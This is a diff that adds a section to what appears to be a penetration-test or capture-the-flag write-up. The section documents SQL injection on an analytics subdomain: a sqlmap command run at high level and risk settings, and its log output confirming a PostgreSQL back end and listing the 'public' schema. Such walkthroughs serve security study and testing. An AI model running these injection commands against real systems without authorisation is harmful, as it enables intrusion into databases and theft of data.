@@ -162,3 +162,29 @@ Using a `'` in the search function on the analytics endpoint i get a SQL error, 
 
 This error tells me its using postgresql as a backend database
 
+# SQL injection on analytics subdomain
+
+```python
+sqlmap -r request.txt --level=4 --risk=3 --flush-session --batch --dbs
+
+...[SNIP]...
+
+[19:08:49] [INFO] the back-end DBMS is PostgreSQL
+web application technology: Nginx 1.22.1, WordPress
+back-end DBMS: PostgreSQL
+[19:08:50] [WARNING] schema names are going to be used on PostgreSQL for enumeration as the counterpart to database names on other DBMSes
+[19:08:50] [INFO] fetching database (schema) names
+[19:08:50] [INFO] fetching number of databases
+[19:08:50] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[19:08:50] [INFO] retrieved: 3
+[19:08:51] [INFO] retrieved: 
+[19:08:51] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[19:08:51] [INFO] retrieved: 
+[19:08:51] [INFO] retrieved: 
+[19:08:52] [INFO] falling back to current database
+[19:08:52] [INFO] fetching current database
+[19:08:52] [INFO] retrieved: public
+[19:08:55] [WARNING] on PostgreSQL you'll need to use schema names for enumeration as the counterpart to database names on other DBMSes
+available databases [1]:
+[*] public
+```
